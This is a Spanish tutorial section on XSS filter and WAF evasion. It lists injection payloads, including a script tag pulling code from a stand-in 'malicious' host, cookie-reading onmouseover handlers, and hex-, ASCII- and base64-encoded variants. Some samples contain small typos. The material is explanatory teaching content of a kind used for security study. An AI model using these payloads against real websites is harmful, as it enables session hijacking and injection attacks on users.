# 6.7.4 - Técnicas de Evasión de XSS
Se pueden utilizar numerosas técnicas para evadir las protecciones y los productos de seguridad XSS, como los firewalls de aplicaciones web (WAF). En lugar de enumerar todas las diferentes técnicas de evasión descritas por OWASP, esta sección revisa algunas de la técnicas más populares.<br>
Primero, echemos un vistazo a una inyección de JavaScript XSS que sería detectada por la mayoría de los filtros y soluciones de seguridad XSS:<br>

```HTML
    <SCRIPT SRC=http://malicious.h4cker.org/xss.js></SCRIPT>
```
El siguiente ejemplo muestra como la etiqueta HTML __img__ se puede utilizar de varias maneras para evadir potencialmente los filtros XSS:<br>

```HTML
    <img src="javascript:alert('xss');">
    <img src=javascript:alert('xss')>
    <img src=javscript:alert(&quot;XSS&quot;)>
    <img src=javascript:alert('xss')>
```
También es posible utilizar otras etiquetas HTML maliciosas (como etiquetas), como se demuestra aquí:<br>

```HTML
    <a onmouseover="alert(document.cookie)">This is a malicious link</a>
    <a onmouseover=alert(document.cookie)>This is a malicious link</a>
```

Un atacante también puede usar una combinación de referencias de caracteres HTML hexadecimales para evadir potencialmente los filtros XSS:<br>

```HTML
    <img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```
La codificación ASCII de EE. UU. puede omitir muchos filtros de contenido y también se puede utilizar como técnica de evasión, pero solo funciona si el sistema transmite en codificación ASCII de EE. UU. O si se configura manualmente. Esta técnica es útil contra WAF. En el siguiente ejemplo, se muestra el uso de la codificación ASCII de EE. UU. para evadir los WAF:<br>

```
    ¼script¾alert(¢XSS¢)¼/script¾
```

El siguiente ejemplo muestra una técnica de evasión que implica el uso de la etiqueta HTML __embed__ para insertar un archivo de Gráficos Vectoriales Escalables (SVG):<br>

```HTML
    <EMBED SRC=”data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH
    A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcm
    cvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3
    hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaW
    dodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdC
    I+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" 
    AllowScriptAccess="always"></EMBED>
```
